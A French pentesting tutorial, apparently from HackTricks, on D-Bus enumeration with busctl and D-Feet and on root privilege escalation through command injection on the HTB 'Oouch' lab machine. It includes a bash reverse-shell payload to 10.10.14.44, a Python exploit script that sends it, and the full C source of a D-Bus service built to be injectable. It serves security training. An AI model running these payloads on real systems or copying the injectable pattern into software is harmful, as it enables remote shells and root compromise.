# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **Énumération GUI**

D-Bus est utilisé comme médiateur de communications inter-processus (IPC) dans les environnements de bureau Ubuntu. Sur Ubuntu, l'opération simultanée de plusieurs bus de messages est observée : le bus système, principalement utilisé par **des services privilégiés pour exposer des services pertinents à travers le système**, et un bus de session pour chaque utilisateur connecté, exposant des services pertinents uniquement à cet utilisateur spécifique. L'accent ici est principalement mis sur le bus système en raison de son association avec des services fonctionnant à des privilèges plus élevés (par exemple, root) car notre objectif est d'élever les privilèges. Il est noté que l'architecture de D-Bus emploie un 'routeur' par bus de session, qui est responsable de la redirection des messages des clients vers les services appropriés en fonction de l'adresse spécifiée par les clients pour le service avec lequel ils souhaitent communiquer.

Les services sur D-Bus sont définis par les **objets** et **interfaces** qu'ils exposent. Les objets peuvent être comparés à des instances de classe dans les langages OOP standard, chaque instance étant identifiée de manière unique par un **chemin d'objet**. Ce chemin, semblable à un chemin de système de fichiers, identifie de manière unique chaque objet exposé par le service. Une interface clé pour les besoins de recherche est l'interface **org.freedesktop.DBus.Introspectable**, qui dispose d'une méthode unique, Introspect. Cette méthode renvoie une représentation XML des méthodes, signaux et propriétés supportés par l'objet, avec un accent ici sur les méthodes tout en omettant les propriétés et signaux.

Pour communiquer avec l'interface D-Bus, deux outils ont été employés : un outil CLI nommé **gdbus** pour une invocation facile des méthodes exposées par D-Bus dans des scripts, et [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), un outil GUI basé sur Python conçu pour énumérer les services disponibles sur chaque bus et afficher les objets contenus dans chaque service.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Dans la première image, les services enregistrés avec le bus système D-Bus sont montrés, avec **org.debin.apt** spécifiquement mis en évidence après avoir sélectionné le bouton Bus Système. D-Feet interroge ce service pour des objets, affichant des interfaces, des méthodes, des propriétés et des signaux pour les objets choisis, comme vu dans la deuxième image. La signature de chaque méthode est également détaillée.

Une caractéristique notable est l'affichage de l'**ID de processus (pid)** et de la **ligne de commande** du service, utile pour confirmer si le service s'exécute avec des privilèges élevés, ce qui est important pour la pertinence de la recherche.

**D-Feet permet également l'invocation de méthodes** : les utilisateurs peuvent saisir des expressions Python comme paramètres, que D-Feet convertit en types D-Bus avant de les transmettre au service.

Cependant, notez que **certaines méthodes nécessitent une authentification** avant de nous permettre de les invoquer. Nous ignorerons ces méthodes, puisque notre objectif est d'élever nos privilèges sans identifiants au départ.

Notez également que certains des services interrogent un autre service D-Bus nommé org.freedeskto.PolicyKit1 pour savoir si un utilisateur doit être autorisé à effectuer certaines actions ou non.

## **Énumération de la ligne de commande**

### Lister les objets de service

Il est possible de lister les interfaces D-Bus ouvertes avec :
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Connexions

[De wikipedia :](https://en.wikipedia.org/wiki/D-Bus) Lorsqu'un processus établit une connexion à un bus, le bus attribue à la connexion un nom de bus spécial appelé _nom de connexion unique_. Les noms de bus de ce type sont immuables—il est garanti qu'ils ne changeront pas tant que la connexion existe—et, plus important encore, ils ne peuvent pas être réutilisés pendant la durée de vie du bus. Cela signifie qu'aucune autre connexion à ce bus n'aura jamais un tel nom de connexion unique attribué, même si le même processus ferme la connexion au bus et en crée une nouvelle. Les noms de connexion uniques sont facilement reconnaissables car ils commencent par le caractère deux-points—autrement interdit.

### Informations sur l'objet de service

Ensuite, vous pouvez obtenir des informations sur l'interface avec :
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### Lister les interfaces d'un objet de service

Vous devez avoir suffisamment de permissions.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspect Interface of a Service Object

Notez comment dans cet exemple, la dernière interface découverte a été sélectionnée en utilisant le paramètre `tree` (_voir la section précédente_) :
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Notez la méthode `.Block` de l'interface `htb.oouch.Block` (celle qui nous intéresse). Le "s" des autres colonnes peut signifier qu'elle s'attend à une chaîne.

### Interface de surveillance/capture

Avec suffisamment de privilèges (juste les privilèges `send_destination` et `receive_sender` ne suffisent pas), vous pouvez **surveiller une communication D-Bus**.

Pour **surveiller** une **communication**, vous devrez être **root.** Si vous rencontrez encore des problèmes en étant root, consultez [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) et [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Si vous savez comment configurer un fichier de configuration D-Bus pour **permettre aux utilisateurs non root de renifler** la communication, veuillez **me contacter** !

Différentes façons de surveiller :
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Dans l'exemple suivant, l'interface `htb.oouch.Block` est surveillée et **le message "**_**lalalalal**_**" est envoyé par erreur** :
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Vous pouvez utiliser `capture` au lieu de `monitor` pour enregistrer les résultats dans un fichier pcap.

#### Filtrer tout le bruit <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

S'il y a trop d'informations sur le bus, passez une règle de correspondance comme ceci :
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Plusieurs règles peuvent être spécifiées. Si un message correspond à _l'une_ des règles, le message sera imprimé. Comme ceci :
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Voir la [documentation D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) pour plus d'informations sur la syntaxe des règles de correspondance.

### Plus

`busctl` a encore plus d'options, [**trouvez-les toutes ici**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Scénario vulnérable**

En tant qu'utilisateur **qtc à l'intérieur de l'hôte "oouch" de HTB**, vous pouvez trouver un **fichier de configuration D-Bus inattendu** situé dans _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Notez dans la configuration précédente que **vous devrez être l'utilisateur `root` ou `www-data` pour envoyer et recevoir des informations** via cette communication D-BUS.

En tant qu'utilisateur **qtc** à l'intérieur du conteneur docker **aeb4525789d8**, vous pouvez trouver du code lié à dbus dans le fichier _/code/oouch/routes.py._ Voici le code intéressant :
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Comme vous pouvez le voir, il **se connecte à une interface D-Bus** et envoie à la **fonction "Block"** l'"client_ip".

De l'autre côté de la connexion D-Bus, il y a un binaire compilé en C qui s'exécute. Ce code **écoute** sur la connexion D-Bus **pour l'adresse IP et appelle iptables via la fonction `system`** pour bloquer l'adresse IP donnée.\
**L'appel à `system` est intentionnellement vulnérable à l'injection de commandes**, donc un payload comme le suivant créera un reverse shell : `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploitez-le

À la fin de cette page, vous pouvez trouver le **code C complet de l'application D-Bus**. À l'intérieur, vous pouvez trouver entre les lignes 91-97 **comment le `chemin d'objet D-Bus`** **et le `nom de l'interface`** sont **enregistrés**. Cette information sera nécessaire pour envoyer des informations à la connexion D-Bus :
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Aussi, à la ligne 57, vous pouvez constater que **la seule méthode enregistrée** pour cette communication D-Bus s'appelle `Block`(_**C'est pourquoi dans la section suivante, les charges utiles vont être envoyées à l'objet de service `htb.oouch.Block`, l'interface `/htb/oouch/Block` et le nom de la méthode `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Le code python suivant enverra la charge utile à la connexion D-Bus à la méthode `Block` via `block_iface.Block(runme)` (_notez qu'il a été extrait du morceau de code précédent_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl et dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` est un outil utilisé pour envoyer des messages au “Message Bus”
- Message Bus – Un logiciel utilisé par les systèmes pour faciliter les communications entre applications. Il est lié à la Message Queue (les messages sont ordonnés en séquence) mais dans Message Bus, les messages sont envoyés dans un modèle d'abonnement et aussi très rapidement.
- Le tag “-system” est utilisé pour mentionner qu'il s'agit d'un message système, et non d'un message de session (par défaut).
- Le tag “–print-reply” est utilisé pour imprimer notre message de manière appropriée et recevoir toute réponse dans un format lisible par l'homme.
- “–dest=Dbus-Interface-Block” L'adresse de l'interface Dbus.
- “–string:” – Type de message que nous souhaitons envoyer à l'interface. Il existe plusieurs formats pour envoyer des messages comme double, bytes, booleans, int, objpath. Parmi ceux-ci, le “object path” est utile lorsque nous voulons envoyer un chemin de fichier à l'interface Dbus. Nous pouvons utiliser un fichier spécial (FIFO) dans ce cas pour passer une commande à l'interface au nom d'un fichier. “string:;” – Ceci est pour rappeler le chemin de l'objet où nous plaçons le fichier/commande de shell inversé FIFO.

_Remarque que dans `htb.oouch.Block.Block`, la première partie (`htb.oouch.Block`) fait référence à l'objet de service et la dernière partie (`.Block`) fait référence au nom de la méthode._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Références

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{{#include ../../banners/hacktricks-training.md}}
